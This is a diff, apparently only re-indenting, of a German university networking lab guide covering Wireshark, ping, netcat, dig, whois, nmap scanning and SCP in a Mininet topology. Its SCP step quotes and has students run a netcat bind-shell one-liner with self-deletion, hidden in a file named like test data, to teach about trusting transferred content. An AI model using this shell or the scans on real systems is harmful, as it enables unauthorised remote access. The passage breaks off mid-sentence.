@@ -43,57 +43,57 @@ uns die kontrollierte, emulierte Topologie von `topo01` ansehen.
     davon unberührt und funktioniert weiterhin unverändert (siehe Teil 2).
 
 1. Öffnet ein Terminal auf dem Desktop und startet Wireshark mit erhöhten
-   Rechten, damit alle Interfaces sichtbar sind:
+    Rechten, damit alle Interfaces sichtbar sind:
 
-   ```bash
-   sudo wireshark
-   ```
+    ```bash
+    sudo wireshark
+    ```
 
-   Startet die Aufzeichnung auf **allen** Interfaces (ihr braucht für diesen
-   Teil keine Mininet-Topologie).
+    Startet die Aufzeichnung auf **allen** Interfaces (ihr braucht für diesen
+    Teil keine Mininet-Topologie).
 
 2. Ermittelt in einem zweiten Terminal die IP-Adresse von `becke.net`:
 
-   ```bash
-   nslookup becke.net
-   ```
+    ```bash
+    nslookup becke.net
+    ```
 
-   Merkt euch die ausgegebene IPv4-Adresse – ihr braucht sie gleich für den
-   Wireshark-Filter.
+    Merkt euch die ausgegebene IPv4-Adresse – ihr braucht sie gleich für den
+    Wireshark-Filter.
 
 3. Erzeugt Verkehr zu dieser Adresse:
 
-   ```bash
-   curl https://becke.net
-   ```
+    ```bash
+    curl https://becke.net
+    ```
 
 4. Filtert in Wireshark auf genau diesen Verkehr, damit ihr nicht im
-   restlichen Hintergrundrauschen des Betriebssystems sucht:
+    restlichen Hintergrundrauschen des Betriebssystems sucht:
 
-   ```text
-   ip.addr == <eure ermittelte IP-Adresse>
-   ```
+    ```text
+    ip.addr == <eure ermittelte IP-Adresse>
+    ```
 
 5. Wählt eines der TCP-Pakete dieser Kommunikation aus und identifiziert im
-   mittleren Wireshark-Fensterbereich alle vier Schichten der TCP/IP-Suite
-   und ihre jeweiligen Protokolleinheiten:
+    mittleren Wireshark-Fensterbereich alle vier Schichten der TCP/IP-Suite
+    und ihre jeweiligen Protokolleinheiten:
 
-    - **Anwendungsschicht:** HTTP (bzw. TLS-Record bei HTTPS)
-    - **Transportschicht:** TCP-Segment (Ports, Sequenznummern, Flags)
-    - **Netzwerkschicht:** IP-Header (IPv4 oder IPv6, Quell-/Zieladresse)
-    - **Verbindungsschicht:** Ethernet-Header (MAC-Adressen)
+     - **Anwendungsschicht:** HTTP (bzw. TLS-Record bei HTTPS)
+     - **Transportschicht:** TCP-Segment (Ports, Sequenznummern, Flags)
+     - **Netzwerkschicht:** IP-Header (IPv4 oder IPv6, Quell-/Zieladresse)
+     - **Verbindungsschicht:** Ethernet-Header (MAC-Adressen)
 
 6. Wiederholt das Experiment lokal, ohne das Netz zu verlassen:
 
-   ```bash
-   ping 127.0.0.1
-   ```
+    ```bash
+    ping 127.0.0.1
+    ```
 
-   Filtert in Wireshark auf `icmp` und identifiziert erneut die vier
-   Schichten. Was fällt bei der Verbindungsschicht (Schicht 1/2) im
-   Vergleich zu den vorherigen, "echten" Paketen auf? (Stichwort: Loopback
-   hat keine reale Ethernet-Übertragung, entsprechend fehlen bzw. unterscheiden
-   sich die Link-Layer-Header.)
+    Filtert in Wireshark auf `icmp` und identifiziert erneut die vier
+    Schichten. Was fällt bei der Verbindungsschicht (Schicht 1/2) im
+    Vergleich zu den vorherigen, "echten" Paketen auf? (Stichwort: Loopback
+    hat keine reale Ethernet-Übertragung, entsprechend fehlen bzw. unterscheiden
+    sich die Link-Layer-Header.)
 
 !!! tip "Fortschritt festhalten (optional)"
     Diesen Teil geschafft? Optional fuer die Admin-Uebersicht vermerken
@@ -124,327 +124,327 @@ aus zwei Endgeräten `h1` und `h2`, zwei Routern `r1`/`r2` dazwischen sowie
 einem NAT-Uplink ins echte Internet.
 
 1. **Netz starten.** Wechselt in das Topologie-Verzeichnis und startet die
-   Emulation:
+    Emulation:
 
-   ```bash
-   cd ~/rn-practice/topo01
-   ./start-topo01.sh
-   ```
+    ```bash
+    cd ~/rn-practice/topo01
+    ./start-topo01.sh
+    ```
 
-   Das Skript ruft zuerst `getIntWithIntenet.sh` auf (ermittelt das
-   Netzwerkinterface mit Internetzugang für den NAT-Uplink) und startet
-   danach `topo01.py`. In einigen Installationen werdet ihr nach dem
-   `sudo`-Passwort (`mininet`) gefragt.
+    Das Skript ruft zuerst `getIntWithIntenet.sh` auf (ermittelt das
+    Netzwerkinterface mit Internetzugang für den NAT-Uplink) und startet
+    danach `topo01.py`. In einigen Installationen werdet ihr nach dem
+    `sudo`-Passwort (`mininet`) gefragt.
 
-   !!! warning "Reihenfolge beachten"
-       Ruft `topo01.py` niemals direkt auf, ohne vorher `getIntWithIntenet.sh`
-       laufen zu lassen (das macht `start-topo01.sh` automatisch für euch).
-       Details dazu im Abschnitt [Potenzielle Herausforderungen](#potenzielle-herausforderungen)
-       unten.
+    !!! warning "Reihenfolge beachten"
+        Ruft `topo01.py` niemals direkt auf, ohne vorher `getIntWithIntenet.sh`
+        laufen zu lassen (das macht `start-topo01.sh` automatisch für euch).
+        Details dazu im Abschnitt [Potenzielle Herausforderungen](#potenzielle-herausforderungen)
+        unten.
 
-   Nach dem Start öffnen sich automatisch zwei Terminalfenster – eines für
-   `h1`, eines für `h2` (Mininet startet diese selbst über seine interne
-   `makeTerm()`-Funktion, ihr müsst dafür nichts extra eingeben). Für die
-   Router `r1`/`r2` oder falls ihr eines der beiden Fenster versehentlich
-   schließt, öffnet ihr auf der Mininet-Konsole ein weiteres Terminal mit:
+    Nach dem Start öffnen sich automatisch zwei Terminalfenster – eines für
+    `h1`, eines für `h2` (Mininet startet diese selbst über seine interne
+    `makeTerm()`-Funktion, ihr müsst dafür nichts extra eingeben). Für die
+    Router `r1`/`r2` oder falls ihr eines der beiden Fenster versehentlich
+    schließt, öffnet ihr auf der Mininet-Konsole ein weiteres Terminal mit:
 
-   ```text
-   mininet> xterm <node>
-   ```
+    ```text
+    mininet> xterm <node>
+    ```
 
-   z. B. `mininet> xterm r1`. Dieser Befehl bleibt unverändert Teil des
-   dokumentierten Mininet-Workflows und funktioniert in der aktuellen
-   Umgebung weiterhin genauso wie beschrieben.
+    z. B. `mininet> xterm r1`. Dieser Befehl bleibt unverändert Teil des
+    dokumentierten Mininet-Workflows und funktioniert in der aktuellen
+    Umgebung weiterhin genauso wie beschrieben.
 
-   !!! note "Playwright-Screenshot-Referenz"
-       Für die Verifikation, dass sich nach `./start-topo01.sh` bzw. nach
-       `mininet> xterm <node>` tatsächlich ein Terminalfenster für den Knoten
-       öffnet, eignet sich ein **Fenster-Screenshot** (siehe
-       `tests/e2e/specs/screenshots.spec.ts`, Test "Fenster-Screenshot:
-       Standardterminal ist offen") besser als ein Zeilen-Screenshot: hier
-       geht es um den sichtbaren UI-Zustand (ein neues Fenster ist da), nicht
-       um eine einzelne Textzeile.
+    !!! note "Playwright-Screenshot-Referenz"
+        Für die Verifikation, dass sich nach `./start-topo01.sh` bzw. nach
+        `mininet> xterm <node>` tatsächlich ein Terminalfenster für den Knoten
+        öffnet, eignet sich ein **Fenster-Screenshot** (siehe
+        `tests/e2e/specs/screenshots.spec.ts`, Test "Fenster-Screenshot:
+        Standardterminal ist offen") besser als ein Zeilen-Screenshot: hier
+        geht es um den sichtbaren UI-Zustand (ein neues Fenster ist da), nicht
+        um eine einzelne Textzeile.
 
-   ![Drei echte xfce4-terminal-Fenster nach dem Start von topo01: links die Mininet-CLI mit dem Ergebnis von `pingall` (75% dropped), rechts oben "Node: h1", rechts unten "Node: h2"](../assets/screenshots/01-netzwerkgrundlagen-tools/topo01-xterm-pingall.png)
-   *Die von Mininet automatisch geöffneten Knoten-Terminals sind technisch
-   `xfce4-terminal`-Fenster (nicht `xterm`), siehe Hinweis oben. Der
-   `pingall`-Befehl auf der Mininet-Konsole zeigt hier live die erwartete
-   75-%-Verlustrate zwischen `h1` und `h2` – das ist die in
-   [Potenzielle Herausforderungen](#potenzielle-herausforderungen)
-   beschriebene, absichtliche asymmetrische Routing-Topologie.*
+    ![Drei echte xfce4-terminal-Fenster nach dem Start von topo01: links die Mininet-CLI mit dem Ergebnis von `pingall` (75% dropped), rechts oben "Node: h1", rechts unten "Node: h2"](../assets/screenshots/01-netzwerkgrundlagen-tools/topo01-xterm-pingall.png)
+    *Die von Mininet automatisch geöffneten Knoten-Terminals sind technisch
+    `xfce4-terminal`-Fenster (nicht `xterm`), siehe Hinweis oben. Der
+    `pingall`-Befehl auf der Mininet-Konsole zeigt hier live die erwartete
+    75-%-Verlustrate zwischen `h1` und `h2` – das ist die in
+    [Potenzielle Herausforderungen](#potenzielle-herausforderungen)
+    beschriebene, absichtliche asymmetrische Routing-Topologie.*
 
 2. **Konnektivität mit Ping prüfen.** Öffnet das Terminal für `h1` und führt
-   nacheinander aus:
+    nacheinander aus:
 
-   ```bash
-   ping -c 4 10.0.6.2        # Ping mit numerischer IPv4-Adresse (h2)
-   ping -c 4 h2              # Ping mit Namen statt IP
-   ping -c 4 10.0.5.1        # Ping an ein anderes System im lokalen Segment
-   ping -c 4 1.1.1.1         # Ping ins Internet (numerisch) - siehe unten!
-   ping -c 4 one.one.one.one # Ping ins Internet mit Namen (dasselbe Ziel)
-   ```
+    ```bash
+    ping -c 4 10.0.6.2        # Ping mit numerischer IPv4-Adresse (h2)
+    ping -c 4 h2              # Ping mit Namen statt IP
+    ping -c 4 10.0.5.1        # Ping an ein anderes System im lokalen Segment
+    ping -c 4 1.1.1.1         # Ping ins Internet (numerisch) - siehe unten!
+    ping -c 4 one.one.one.one # Ping ins Internet mit Namen (dasselbe Ziel)
+    ```
 
-   Notiert euch die Ausgaben (RTT, TTL) der **lokalen** Ziele und vergleicht
-   sie miteinander: Was fällt euch auf, und wie erklärt ihr die Unterschiede?
+    Notiert euch die Ausgaben (RTT, TTL) der **lokalen** Ziele und vergleicht
+    sie miteinander: Was fällt euch auf, und wie erklärt ihr die Unterschiede?
 
-   Wechselt danach zum Terminal von `h2` und wiederholt das Experiment aus
-   dessen Sicht:
+    Wechselt danach zum Terminal von `h2` und wiederholt das Experiment aus
+    dessen Sicht:
 
-   ```bash
-   ping -c 4 10.0.1.1
-   ping -c 4 h1
-   ping -c 4 1.1.1.1
-   ```
+    ```bash
+    ping -c 4 10.0.1.1
+    ping -c 4 h1
+    ping -c 4 1.1.1.1
+    ```
 
-   Vergleicht RTT und TTL der lokalen Ziele zwischen `h1` und `h2`. Warum sind
-   sie unterschiedlich? Was sagt euch das über die Anzahl der Zwischenstationen
-   (Hops)?
+    Vergleicht RTT und TTL der lokalen Ziele zwischen `h1` und `h2`. Warum sind
+    sie unterschiedlich? Was sagt euch das über die Anzahl der Zwischenstationen
+    (Hops)?
 
-   !!! warning "Die beiden Internet-Pings schlagen fehl – und das ist die Aufgabe"
-       `ping 1.1.1.1` und `ping one.one.one.one` liefern **100 % Paketverlust**.
-       Das ist **kein Fehler eures Containers** und auch keine fehlende
-       Internet-Anbindung, sondern eine **Filterregel auf dem Weg nach
-       draußen**. Weist das selbst nach, statt es zu glauben:
+    !!! warning "Die beiden Internet-Pings schlagen fehl – und das ist die Aufgabe"
+        `ping 1.1.1.1` und `ping one.one.one.one` liefern **100 % Paketverlust**.
+        Das ist **kein Fehler eures Containers** und auch keine fehlende
+        Internet-Anbindung, sondern eine **Filterregel auf dem Weg nach
+        draußen**. Weist das selbst nach, statt es zu glauben:
 
-       ```bash
-       getent hosts one.one.one.one       # loest der Name auf?
-       nc -z -w 3 1.1.1.1 443             # geht eine TCP-Verbindung durch?
-       echo $?                            # 0 = Verbindung stand
-       traceroute -n -m 6 1.1.1.1         # wo endet der Weg?
-       ```
+        ```bash
+        getent hosts one.one.one.one       # loest der Name auf?
+        nc -z -w 3 1.1.1.1 443             # geht eine TCP-Verbindung durch?
+        echo $?                            # 0 = Verbindung stand
+        traceroute -n -m 6 1.1.1.1         # wo endet der Weg?
+        ```
 
-       **Fragen, die ihr aus euren eigenen Ausgaben beantwortet:**
+        **Fragen, die ihr aus euren eigenen Ausgaben beantwortet:**
 
-       1. Der Name löst auf, und die TCP-Verbindung auf Port 443 kommt
-          zustande – welche Schicht des Stapels ist also **nicht** das Problem?
-       2. `ping` nutzt ICMP, `nc` nutzt TCP. Beide laufen über IP. Was genau
-          wird demnach gefiltert, und auf welcher Schicht sitzt der Filter?
-       3. `traceroute` zeigt euch die letzte antwortende Station vor der
-          Stille. Liegt der Filter **in eurem Container**, im **Hostnetz** oder
-          **weiter draußen**? Begründet mit der Hop-Nummer.
-       4. Warum ist "kein Ping-Echo" ein **schlechter** Beweis dafür, dass ein
-          Rechner nicht erreichbar ist? Nennt zwei Gründe.
+        1. Der Name löst auf, und die TCP-Verbindung auf Port 443 kommt
+           zustande – welche Schicht des Stapels ist also **nicht** das Problem?
+        2. `ping` nutzt ICMP, `nc` nutzt TCP. Beide laufen über IP. Was genau
+           wird demnach gefiltert, und auf welcher Schicht sitzt der Filter?
+        3. `traceroute` zeigt euch die letzte antwortende Station vor der
+           Stille. Liegt der Filter **in eurem Container**, im **Hostnetz** oder
+           **weiter draußen**? Begründet mit der Hop-Nummer.
+        4. Warum ist "kein Ping-Echo" ein **schlechter** Beweis dafür, dass ein
+           Rechner nicht erreichbar ist? Nennt zwei Gründe.
 
-       Diese Asymmetrie – ICMP gesperrt, TCP erlaubt – ist in Unternehmens- und
-       Hochschulnetzen der Normalfall, nicht die Ausnahme. Wer sie kennt,
-       verschwendet bei einer Störungssuche keine Zeit mit dem falschen
-       Werkzeug.
+        Diese Asymmetrie – ICMP gesperrt, TCP erlaubt – ist in Unternehmens- und
+        Hochschulnetzen der Normalfall, nicht die Ausnahme. Wer sie kennt,
+        verschwendet bei einer Störungssuche keine Zeit mit dem falschen
+        Werkzeug.
 
-       *Am 2026-09-24 in dieser Umgebung gemessen: `1.1.1.1`, `8.8.8.8` und
-       `9.9.9.9` jeweils 100 % Verlust, `1.1.1.1:443` per TCP erreichbar,
-       `traceroute` endet nach der zweiten Station.*
+        *Am 2026-09-24 in dieser Umgebung gemessen: `1.1.1.1`, `8.8.8.8` und
+        `9.9.9.9` jeweils 100 % Verlust, `1.1.1.1:443` per TCP erreichbar,
+        `traceroute` endet nach der zweiten Station.*
 
-   !!! warning "h1 ↔ h2 direkt: kein Ping möglich"
-       Ein direkter `ping` zwischen `h1` und `h2` schlägt in dieser Topologie
-       fehl bzw. liefert Paketverlust. Das ist **kein Fehler der Umgebung**,
-       sondern Absicht: `h1` und `h2` liegen in unterschiedlichen Subnetzen
-       und sind nur über die Router `r1`/`r2` mit asymmetrischem Routing
-       verbunden. Genau das ist die Beobachtung, die die nächste Teilaufgabe
-       von euch einfordert – siehe auch
-       [Potenzielle Herausforderungen](#potenzielle-herausforderungen).
+    !!! warning "h1 ↔ h2 direkt: kein Ping möglich"
+        Ein direkter `ping` zwischen `h1` und `h2` schlägt in dieser Topologie
+        fehl bzw. liefert Paketverlust. Das ist **kein Fehler der Umgebung**,
+        sondern Absicht: `h1` und `h2` liegen in unterschiedlichen Subnetzen
+        und sind nur über die Router `r1`/`r2` mit asymmetrischem Routing
+        verbunden. Genau das ist die Beobachtung, die die nächste Teilaufgabe
+        von euch einfordert – siehe auch
+        [Potenzielle Herausforderungen](#potenzielle-herausforderungen).
 
 3. **Ping mit Wireshark beobachten.** Öffnet auf `h2` Wireshark im
-   Hintergrund und wählt das Interface `h2-eth0` aus:
+    Hintergrund und wählt das Interface `h2-eth0` aus:
 
-   ```bash
-   wireshark &
-   ```
+    ```bash
+    wireshark &
+    ```
 
-   Wechselt zum Terminal von `h1` und sendet einen einzelnen Ping:
+    Wechselt zum Terminal von `h1` und sendet einen einzelnen Ping:
 
-   ```bash
-   ping -c 1 h2
-   ```
+    ```bash
+    ping -c 1 h2
+    ```
 
-   ![Wireshark-Fenster mit laufendem Capture auf h2-eth0, Anzeigefilter icmp gesetzt, Paketliste mit abwechselnden Echo-Request/-Reply zwischen 10.0.1.2 und 10.0.6.2, Detailbereich mit aufgeklappten Ethernet-, IP- und ICMP-Headern und Hex-Dump](../assets/screenshots/01-netzwerkgrundlagen-tools/wireshark-icmp-layers.png)
-   *Echter Mitschnitt auf `h2-eth0`, während `h1` per `ping` Verkehr zu `h2`
-   erzeugt. Der Detailbereich zeigt genau die in Teil 1 gesuchten Schichten:
-   Ethernet II (Verbindungsschicht), Internet Protocol Version 4
-   (Netzwerkschicht) und das ICMP-Paket selbst.*
+    ![Wireshark-Fenster mit laufendem Capture auf h2-eth0, Anzeigefilter icmp gesetzt, Paketliste mit abwechselnden Echo-Request/-Reply zwischen 10.0.1.2 und 10.0.6.2, Detailbereich mit aufgeklappten Ethernet-, IP- und ICMP-Headern und Hex-Dump](../assets/screenshots/01-netzwerkgrundlagen-tools/wireshark-icmp-layers.png)
+    *Echter Mitschnitt auf `h2-eth0`, während `h1` per `ping` Verkehr zu `h2`
+    erzeugt. Der Detailbereich zeigt genau die in Teil 1 gesuchten Schichten:
+    Ethernet II (Verbindungsschicht), Internet Protocol Version 4
+    (Netzwerkschicht) und das ICMP-Paket selbst.*
 
-   Welche Protokolle erscheinen in der Spalte "Protocol"? Wiederholt den
-   Ping noch zwei weitere Male (`ping -c 1 h2`) – welche Pakettypen
-   wiederholen sich, welche nicht? Führt anschließend `ping -c 1 10.0.2.3`
-   aus (eine nicht existierende Adresse) und beobachtet den Unterschied.
-   Schließt danach das Wireshark-Fenster von `h2`, startet Wireshark
-   stattdessen auf `h1` (Interface `h1-eth0`, nicht vergessen: `wireshark &`
-   mit `&`, damit das Terminal weiter benutzbar bleibt) und wiederholt
-   `ping -c 1 10.0.2.3`. Vergleicht, was auf beiden Seiten sichtbar ist, und
-   formuliert eine These, warum sich die Beobachtung unterscheidet.
+    Welche Protokolle erscheinen in der Spalte "Protocol"? Wiederholt den
+    Ping noch zwei weitere Male (`ping -c 1 h2`) – welche Pakettypen
+    wiederholen sich, welche nicht? Führt anschließend `ping -c 1 10.0.2.3`
+    aus (eine nicht existierende Adresse) und beobachtet den Unterschied.
+    Schließt danach das Wireshark-Fenster von `h2`, startet Wireshark
+    stattdessen auf `h1` (Interface `h1-eth0`, nicht vergessen: `wireshark &`
+    mit `&`, damit das Terminal weiter benutzbar bleibt) und wiederholt
+    `ping -c 1 10.0.2.3`. Vergleicht, was auf beiden Seiten sichtbar ist, und
+    formuliert eine These, warum sich die Beobachtung unterscheidet.
 
 4. **Kommunikation mit Netcat herstellen und mit Wireshark beobachten.**
-   Startet auf `h2` (im Verzeichnis `~/rn-practice/topo01`) den vorbereiteten
-   UDP-Netcat-Server:
+    Startet auf `h2` (im Verzeichnis `~/rn-practice/topo01`) den vorbereiteten
+    UDP-Netcat-Server:
 
-   ```bash
-   ./startUDPServerNetcat.sh
-   ```
+    ```bash
+    ./startUDPServerNetcat.sh
+    ```
 
-   Der Inhalt des Skripts (`cat startUDPServerNetcat.sh`) zeigt euch, dass es
-   letztlich nur `netcat -ul 8080` aufruft – ein UDP-Listener auf Port 8080.
-   Wechselt zu `h1` und verbindet euch:
+    Der Inhalt des Skripts (`cat startUDPServerNetcat.sh`) zeigt euch, dass es
+    letztlich nur `netcat -ul 8080` aufruft – ein UDP-Listener auf Port 8080.
+    Wechselt zu `h1` und verbindet euch:
 
-   ```bash
-   netcat -u h2 8080
-   hallo
-   ```
+    ```bash
+    netcat -u h2 8080
+    hallo
+    ```
 
-   Markiert in Wireshark (auf `h2`, Interface `h2-eth0`) das letzte
-   UDP-Paket. Im unteren Fensterbereich ("Packet Bytes") seht ihr die
-   Nutzdaten hexadezimal und in ASCII – euer "hallo" sollte dort auftauchen.
-   Prüft, wie viele Bytes die Nutzdaten tatsächlich belegen und warum
-   (Stichwort ASCII-Kodierung, ein Zeichen = ein Byte).
+    Markiert in Wireshark (auf `h2`, Interface `h2-eth0`) das letzte
+    UDP-Paket. Im unteren Fensterbereich ("Packet Bytes") seht ihr die
+    Nutzdaten hexadezimal und in ASCII – euer "hallo" sollte dort auftauchen.
+    Prüft, wie viele Bytes die Nutzdaten tatsächlich belegen und warum
+    (Stichwort ASCII-Kodierung, ein Zeichen = ein Byte).
 
 5. **DNS-Auflösung mit Dig.** Auf `h1` läuft ein leichtgewichtiger
-   DNS-Forwarder/DHCP-Server (`dnsmasq`). Führt aus:
+    DNS-Forwarder/DHCP-Server (`dnsmasq`). Führt aus:
 
-   ```bash
-   dig bundesregierung.de
-   ```
+    ```bash
+    dig bundesregierung.de
+    ```
 
-   und sucht in der `ANSWER SECTION` nach der aufgelösten IPv4-Adresse.
+    und sucht in der `ANSWER SECTION` nach der aufgelösten IPv4-Adresse.
 
 6. **HTTP/REST mit Curl gegen eine externe API, und der gleiche Dienst im
-   Browser.** Fragt mit Curl die Geolocation-API von ip-api.com ab (ersetzt
-   die Beispieladresse durch die zuvor per `dig` ermittelte):
+    Browser.** Fragt mit Curl die Geolocation-API von ip-api.com ab (ersetzt
+    die Beispieladresse durch die zuvor per `dig` ermittelte):
 
-   ```bash
-   curl http://ip-api.com/json/<ermittelte-IP-Adresse>
-   ```
+    ```bash
+    curl http://ip-api.com/json/<ermittelte-IP-Adresse>
+    ```
 
-   Vergleicht das Ergebnis mit dem Aufruf derselben Abfrage im Browser unter
-   `https://ip-api.com/#<ermittelte-IP-Adresse>`. Welche Darstellung eignet
-   sich für die automatische Weiterverarbeitung durch ein Programm, welche
-   für einen Menschen?
+    Vergleicht das Ergebnis mit dem Aufruf derselben Abfrage im Browser unter
+    `https://ip-api.com/#<ermittelte-IP-Adresse>`. Welche Darstellung eignet
+    sich für die automatische Weiterverarbeitung durch ein Programm, welche
+    für einen Menschen?
 
-   !!! note "Korrektur gegenüber dem Originaldokument"
-       Das Originaldokument bezeichnet ip-api.com als von "Klaxoon SAS"
-       betrieben. Das ist unzutreffend: Laut dem offiziellen Impressum/den
-       Nutzungsbedingungen von ip-api.com wird der Dienst von **Artia
-       International S.R.L.** (Bukarest, Rumänien) betrieben. Klaxoon ist ein
-       unabhängiges, in Frankreich ansässiges Unternehmen für
-       Kollaborations-Software und hat mit ip-api.com nichts zu tun.
+    !!! note "Korrektur gegenüber dem Originaldokument"
+        Das Originaldokument bezeichnet ip-api.com als von "Klaxoon SAS"
+        betrieben. Das ist unzutreffend: Laut dem offiziellen Impressum/den
+        Nutzungsbedingungen von ip-api.com wird der Dienst von **Artia
+        International S.R.L.** (Bukarest, Rumänien) betrieben. Klaxoon ist ein
+        unabhängiges, in Frankreich ansässiges Unternehmen für
+        Kollaborations-Software und hat mit ip-api.com nichts zu tun.
 
 7. **WHOIS-Abfrage.** Auf `h1`:
 
-   ```bash
-   whois mozilla.com
-   ```
+    ```bash
+    whois mozilla.com
+    ```
 
-   Achtet auf Felder wie Street/City. Wiederholt die Abfrage mit
-   `bundesregierung.de` und vergleicht: Für `.de`-Domains ist die DENIC
-   zuständig, und seit der DSGVO sind personenbezogene WHOIS-Daten für
-   `.de`-Domains nicht mehr standardmäßig öffentlich einsehbar.
+    Achtet auf Felder wie Street/City. Wiederholt die Abfrage mit
+    `bundesregierung.de` und vergleicht: Für `.de`-Domains ist die DENIC
+    zuständig, und seit der DSGVO sind personenbezogene WHOIS-Daten für
+    `.de`-Domains nicht mehr standardmäßig öffentlich einsehbar.
 
 8. **Netzwerkscan mit Nmap.** Auf `h2`:
 
-   ```bash
-   nmap -sn 10.0.4.0/24
-   ```
+    ```bash
+    nmap -sn 10.0.4.0/24
+    ```
 
-   Prüft, welche Hosts erkannt werden. Versucht anschließend, das
-   Betriebssystem eines gefundenen Hosts zu identifizieren:
+    Prüft, welche Hosts erkannt werden. Versucht anschließend, das
+    Betriebssystem eines gefundenen Hosts zu identifizieren:
 
-   ```bash
-   nmap -O <gefundene-IP>
-   ```
+    ```bash
+    nmap -O <gefundene-IP>
+    ```
 
-   Findet heraus, auf welchem Host der Dienst OpenSSH erreichbar ist, und
-   prüft mit `searchsploit`, ob es bekannte Schwachstellen gibt:
+    Findet heraus, auf welchem Host der Dienst OpenSSH erreichbar ist, und
+    prüft mit `searchsploit`, ob es bekannte Schwachstellen gibt:
 
-   ```bash
-   searchsploit OpenSSH
-   ```
+    ```bash
+    searchsploit OpenSSH
+    ```
 
-   Port-Scans dienen hier ausschließlich der eigenen, isolierten
-   Mininet-Umgebung. Gegen fremde Systeme ohne Zustimmung sind sie in
-   Deutschland rechtlich heikel und teils strafbar.
+    Port-Scans dienen hier ausschließlich der eigenen, isolierten
+    Mininet-Umgebung. Gegen fremde Systeme ohne Zustimmung sind sie in
+    Deutschland rechtlich heikel und teils strafbar.
 
 9. **Sichere Übertragung mit SCP, und was trotz Verschlüsselung sichtbar
-   bleibt.** Startet auf `h2` Wireshark (Interface `h2-eth0`). Startet auf
-   `h1` den SSH-Server:
+    bleibt.** Startet auf `h2` Wireshark (Interface `h2-eth0`). Startet auf
+    `h1` den SSH-Server:
 
-   ```bash
-   /usr/sbin/sshd -D -f sshd.conf
-   ```
+    ```bash
+    /usr/sbin/sshd -D -f sshd.conf
+    ```
 
-   Kopiert anschließend von `h2` aus eine Datei von `h1`:
+    Kopiert anschließend von `h2` aus eine Datei von `h1`:
 
-   ```bash
-   scp mininet@10.0.1.2:~/rn-practice/test30M.txt ./
-   ```
+    ```bash
+    scp mininet@10.0.1.2:~/rn-practice/test30M.txt ./
+    ```
 
-   !!! note "Korrektur gegenüber dem Originaldokument"
-       Das Originaldokument verwendet für den Quellpfad uneinheitlich `~`,
-       `/home/mininet/rn-practice/topo01` und `/headless/rn-practice/`. Der
-       tatsächliche, in diesem Repository vorhandene Pfad ist konsequent `~`
-       statt der abweichenden Pfadangaben aus dem Original – `test30M.txt`
-       selbst liegt dabei direkt unter `~/rn-practice/` (Wurzel des
-       vendorierten Verzeichnisses), NICHT unter `~/rn-practice/topo01/`
-       (per Repository-Struktur verifiziert, siehe
-       `mininet-labs/rn-practice/test30M.txt`).
+    !!! note "Korrektur gegenüber dem Originaldokument"
+        Das Originaldokument verwendet für den Quellpfad uneinheitlich `~`,
+        `/home/mininet/rn-practice/topo01` und `/headless/rn-practice/`. Der
+        tatsächliche, in diesem Repository vorhandene Pfad ist konsequent `~`
+        statt der abweichenden Pfadangaben aus dem Original – `test30M.txt`
+        selbst liegt dabei direkt unter `~/rn-practice/` (Wurzel des
+        vendorierten Verzeichnisses), NICHT unter `~/rn-practice/topo01/`
+        (per Repository-Struktur verifiziert, siehe
+        `mininet-labs/rn-practice/test30M.txt`).
 
-   !!! warning "test30M.txt enthält eine echte Reverse-Shell – das ist Absicht"
-       `test30M.txt` heißt zwar wie eine ~30-MB-Testdatei, enthält aber
-       tatsächlich nur einen kurzen Netcat-Bind-Shell-Einzeiler
-       (`mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l 1234 >/tmp/f`) plus
-       Selbstlöschung, kommentiert als "Dieses ist ein geheimes Script". Eine
-       frühere Fassung dieser Anleitung stufte das fälschlich als
-       versehentlich eingecheckten Backdoor ein und ersetzte den Inhalt durch
-       harmlosen Fülltext – das war ein Fehler und wurde zurückgenommen. Es
-       handelt sich um eine **bewusst designte Sicherheitslektion**:
-       Verschlüsselung der Übertragung (SCP/SSH) schützt nur den
-       Transportweg, nicht die Vertrauensentscheidung über den Inhalt am
-       Endpunkt.
+    !!! warning "test30M.txt enthält eine echte Reverse-Shell – das ist Absicht"
+        `test30M.txt` heißt zwar wie eine ~30-MB-Testdatei, enthält aber
+        tatsächlich nur einen kurzen Netcat-Bind-Shell-Einzeiler
+        (`mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l 1234 >/tmp/f`) plus
+        Selbstlöschung, kommentiert als "Dieses ist ein geheimes Script". Eine
+        frühere Fassung dieser Anleitung stufte das fälschlich als
+        versehentlich eingecheckten Backdoor ein und ersetzte den Inhalt durch
+        harmlosen Fülltext – das war ein Fehler und wurde zurückgenommen. Es
+        handelt sich um eine **bewusst designte Sicherheitslektion**:
+        Verschlüsselung der Übertragung (SCP/SSH) schützt nur den
+        Transportweg, nicht die Vertrauensentscheidung über den Inhalt am
+        Endpunkt.
 
-   Beobachtet in Wireshark den TCP-Drei-Wege-Handshake, die
-   SSH-Verhandlungsphase und danach durchgehend verschlüsselten Verkehr –
-   der Dateiinhalt selbst ist nicht einsehbar. Schaut euch die kopierte
-   Datei lokal an:
+    Beobachtet in Wireshark den TCP-Drei-Wege-Handshake, die
+    SSH-Verhandlungsphase und danach durchgehend verschlüsselten Verkehr –
+    der Dateiinhalt selbst ist nicht einsehbar. Schaut euch die kopierte
+    Datei lokal an:
 
-   ```bash
-   cat test30M.txt
-   ```
+    ```bash
+    cat test30M.txt
+    ```
 
-   Darin findet sich ein netcat-Aufruf. Führt ihn probeweise aus, um eine
-   (in dieser isolierten Übung harmlose) Reverse-Shell zu demonstrieren:
+    Darin findet sich ein netcat-Aufruf. Führt ihn probeweise aus, um eine
+    (in dieser isolierten Übung harmlose) Reverse-Shell zu demonstrieren:
 
-   ```bash
-   sh ./test30M.txt
-   ```
+    ```bash
+    sh ./test30M.txt
+    ```
 
-   Nach der Ausführung ist die Datei gelöscht und scheinbar nichts
-   Wesentliches geschehen. Tatsächlich hat sich aber eine Reverse-Shell
-   geöffnet. Verbindet euch von `h1` aus auf die geöffnete Shell und prüft,
-   auf welchem Host ihr tatsächlich Befehle ausführt:
+    Nach der Ausführung ist die Datei gelöscht und scheinbar nichts
+    Wesentliches geschehen. Tatsächlich hat sich aber eine Reverse-Shell
+    geöffnet. Verbindet euch von `h1` aus auf die geöffnete Shell und prüft,
+    auf welchem Host ihr tatsächlich Befehle ausführt:
 
-   ```bash
-   netcat 10.0.6.2 1234
-   ifconfig
-   ```
+    ```bash
+    netcat 10.0.6.2 1234
+    ifconfig
+    ```
 
-   Erscheint ein Interface `h2-eth0`, habt ihr Zugriff auf `h2` – obwohl ihr
-   den Befehl von `h1` aus abgesetzt habt. Aktiviert die Wireshark-Aufnahme
